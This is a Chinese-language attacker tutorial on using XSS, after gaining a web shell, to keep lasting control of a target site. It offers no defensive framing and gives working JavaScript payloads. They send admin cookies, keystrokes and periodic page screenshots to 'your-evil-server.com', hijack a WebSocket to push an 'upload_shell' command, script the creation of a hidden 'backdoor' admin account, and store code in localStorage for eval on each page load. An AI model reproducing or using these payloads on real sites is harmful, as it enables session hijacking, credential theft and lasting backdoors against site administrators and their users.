### 有 Shell 的情况下如何使用 XSS 实现对目标站的长久控制

**1. 利用 XSS 劫持管理员会话**

这是最直接也最常见的 XSS 攻击方式，但在这里，我们将其作为持久化控制的跳板

- **原理：** 当管理员访问存在 XSS 漏洞的页面时，我们的恶意 JavaScript 代码会执行，并窃取管理员的 `cookie`、`sessionStorage`、`localStorage` 等会话信息

- **实现：**

  - **WebShell 注入：** 在您已经获取的 Shell 中，找到一个管理员经常访问的、可写入的文件（例如，网站的公共 JS 文件、后台管理页面模板等）
  - **插入 Payload：** 在该文件中插入以下恶意 JavaScript 代码

  JavaScript

  ```javascript
  fetch('http://your-evil-server.com/log.php?cookie=' + document.cookie);
  ```

  - **获取会话：** 当管理员访问该页面时，他们的 `cookie` 就会被发送到您的服务器 `log.php`。您可以用这些 `cookie` 伪造会话，从而以管理员身份登录后台
  - **持久化：** 只要您能以管理员身份登录，就可以通过后台修改网站配置，上传新的 WebShell，或者进行其他持久化操作

这种方法的优点是简单直接，但缺点是如果管理员退出登录或会话过期，您需要重新等待下一次捕获

**2. 利用 XSS 注入后台管理页面后门**

这种方法更具隐蔽性和持久性，它旨在直接在后台管理系统中创建可控的“后门”

- **原理：** 很多后台管理系统都允许管理员自定义页面内容、插入自定义代码或编辑模板。我们可以利用 XSS，在管理员的浏览器中执行 JavaScript 代码，悄悄地修改这些配置
- **实现：**
  - **自动化操作：** 编写一个 JavaScript 脚本，该脚本可以模拟管理员的点击、表单填写和提交操作
  - **创建新用户：** 脚本可以模拟点击“添加用户”按钮，填写一个新的管理员账户信息（例如，用户名：`backdoor`，密码：`P@ssw0rd`），然后点击“保存”
  - **修改配置文件：** 脚本还可以模拟打开“系统设置”页面，修改网站的配置，例如允许文件上传、关闭安全限制等
  - **注入 Payload：** 将这些自动化操作的 JavaScript 代码注入到存在 XSS 的页面。当管理员访问时，脚本会在后台静默执行，完成上述操作

这种方法的优点是，即使管理员会话过期，我们创建的后门用户依然存在，可以随时用于登录

**3. 利用 XSS 劫持 WebSocket 连接**

如果目标网站使用了 WebSocket 来进行实时通信，这也是一个非常高明的攻击点

- **原理：** WebSocket 是一种在客户端和服务器之间建立持久连接的协议。我们可以利用 XSS，劫持 WebSocket 连接，向服务器发送恶意指令

- **实现：**

  - **注入 WebSocket 劫持代码：**

  JavaScript

  ```javascript
  // 假设原始 WebSocket 连接
  var ws = new WebSocket("wss://target.com/websocket");
  // 劫持
  ws.onmessage = function(event) {
      // 在这里可以拦截或修改 WebSocket 消息
      console.log("Received message from server: " + event.data);
  };
  // 发送恶意指令
  ws.onopen = function() {
      // 假设服务器允许通过 WebSocket 发送命令
      ws.send(JSON.stringify({ "command": "upload_shell", "path": "/uploads/backdoor.php" }));
  };
  ```

  - **持久化：** 通过劫持 WebSocket，我们可以向服务器发送管理员级别的指令，例如要求服务器上传一个新文件（我们的 WebShell）、执行系统命令、或修改数据库记录

这种方法需要对目标网站的 WebSocket 协议有深入了解，但其威力巨大，可以实现几乎实时的控制

**4. 利用 XSS 注入浏览器的持久化存储**

- **原理：** 浏览器中的 `localStorage` 和 `sessionStorage` 允许网页存储数据。我们可以利用 XSS，将我们的恶意代码或配置存储在这些地方，从而实现持久化

- **实现：**

  - **注入 Payload：**

  JavaScript

  ```javascript
  // 将恶意代码或配置存储到 localStorage
  localStorage.setItem('malicious_flag', 'true');
  localStorage.setItem('shell_url', 'http://your-evil-server.com/shell.php');
  ```

  - **持久化：** 当管理员再次访问该页面时，我们可以检查 `localStorage` 中的标志，如果存在，则执行后续的恶意操作（例如，加载远程 JS 文件）

**5. 键盘记录**

- **原理：** 键盘记录器利用 JavaScript 监听 DOM 事件，例如 `keydown` 或 `keypress`，当管理员在后台页面输入账号、密码或其他敏感信息时，脚本会捕获这些按键事件，并将输入的数据发送到攻击者的服务器

- **实现：**

  1. **注入 Payload：** 在您已经拥有 Shell 的前提下，找到一个管理员经常访问的、可写入的 JS 文件。在该文件中注入以下 JavaScript 代码：

  ```js
  // 恶意键盘记录脚本
  document.addEventListener('keydown', function(event) {
      var key = event.key;
      // 将按键数据发送到你的服务器
      fetch('http://your-evil-server.com/log.php?key=' + encodeURIComponent(key));
  });
  ```

  1. **实时数据捕获：** 当管理员在后台登录表单中输入用户名和密码时，每个按键都会被记录下来，并通过 `fetch` 请求发送到您的服务器
  2. **持久化：** 这种方法非常隐蔽，因为脚本在后台静默运行。一旦管理员登录，您不仅能获取他们的账号密码，还能实时监控他们在后台进行的任何操作，例如修改文章、上传文件等

**6. 浏览器屏幕截图**

- **原理：** 利用 HTML5 的 `Canvas` 和 `toDataURL()` 方法，我们可以截取 DOM 元素（例如整个页面）的内容，将其转换为图片数据，并发送给攻击者

- **实现：**

  1. **注入 Payload：** 在可写入的 JS 文件中注入以下代码：

  ```js
  // 定时截图并发送
  setInterval(function() {
      html2canvas(document.body).then(function(canvas) {
          // 将 canvas 内容转换为 base64 格式
          var imageData = canvas.toDataURL("image/png");
          // 将图片数据发送到你的服务器
          fetch('http://your-evil-server.com/screenshot.php', {
              method: 'POST',
              body: JSON.stringify({ image: imageData })
          });
      });
  }, 5000); // 每隔5秒截图一次
  ```

  1. **依赖库：** 需要注意的是，这个方法通常依赖第三方库，例如 `html2canvas.js`。您需要将该库的 JS 文件也注入到目标网站中
  2. **实时监控：** 这种方法可以直观地看到管理员在后台的操作界面，包括他们正在编辑的内容、正在上传的文件等，为您的后续攻击提供丰富的上下文信息。

**7. 利用 XSS 注入持久化 localStorage 后门**

这是一种更具隐蔽性的持久化方法，它不依赖于修改网站文件，而是利用浏览器的本地存储功能

- **原理：** 利用 `localStorage` 将恶意代码片段持久化存储在管理员的浏览器中

- **实现：**

  1. **一次性注入：** 找到一个XSS漏洞点（例如，一个输入框）。输入以下Payload：

  ```html
  <script>
    localStorage.setItem('backdoor', 'your_malicious_javascript_code');
  </script>
  ```

  1. **主页面加载器：** 然后在网站的主 JS 文件中，注入一个检查 `localStorage` 的代码：

  ```js
  // 检查是否存在后门代码
  var backdoorCode = localStorage.getItem('backdoor');
  if (backdoorCode) {
      eval(backdoorCode); // 执行后门代码
  }
  ```

  1. **持久化：** 只要管理员不清空浏览器缓存，即使您修改的输入框被清理了，后门代码依然会存在于 `localStorage` 中，并在每次页面加载时被执行